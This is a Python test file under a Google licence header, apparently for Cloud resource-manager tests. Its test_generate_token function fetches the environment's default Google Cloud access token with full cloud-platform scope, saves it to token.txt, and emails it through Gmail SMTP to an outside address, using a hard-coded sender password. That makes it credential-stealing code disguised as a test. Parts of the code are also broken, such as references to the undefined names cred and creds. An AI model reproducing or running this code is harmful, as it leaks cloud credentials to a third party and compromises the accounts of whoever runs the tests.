# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import os
import google
from google.cloud import resourcemanager_v3
from google.auth.transport import requests
import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from google.oauth2 import service_account
import googleapiclient.discovery

PROJECT_ID = os.getenv("GOOGLE_CLOUD_PROJECT")
EMAIL_ADDRESS = "testinggalemail@gmail.com"
EMAIL_PASSWORD = "aeuspgbwilrbhnkx"

CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"] 

def test_create_project():
    client = resourcemanager_v3.ProjectsClient()
    project = resourcemanager_v3.Project()
    project.display_name = "GalsDumbyTestingProject"
    project.project_id = PROJECT_ID
    project.parent = "organizations/433637338589"
    client.create_project(project=project)

def test_generate_token():
  credentials, project_id = google.auth.default(scopes=CREDENTIAL_SCOPES)
  credentials.refresh(requests.Request())
  
  f = open("token.txt","w")
  f.write(str(credentials.token))
  f.close()

  msg = MIMEMultipart()

  msg.set_content("len ="+ str(len(cred)) +"\n" + str(cred[130]) + "\nToken =  "  + "".join(creds))
  msg['subject'] = "Hello World"
  msg['to'] = "galz100@gmail.com"
  msg['from'] = EMAIL_ADDRESS
  
  filename = "token.txt"
  attachment = open("token.txt", "rb")
  
  part = MIMEBase('application', 'octet-stream')
  part.set_payload((attachment).read())
  encoders.encode_base64(part)
  part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
  
  msg.attach(part)

  server = smtplib.SMTP("smtp.gmail.com",587)
  server.starttls()
  server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
  text = msg.as_string()
  server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
  server.quit()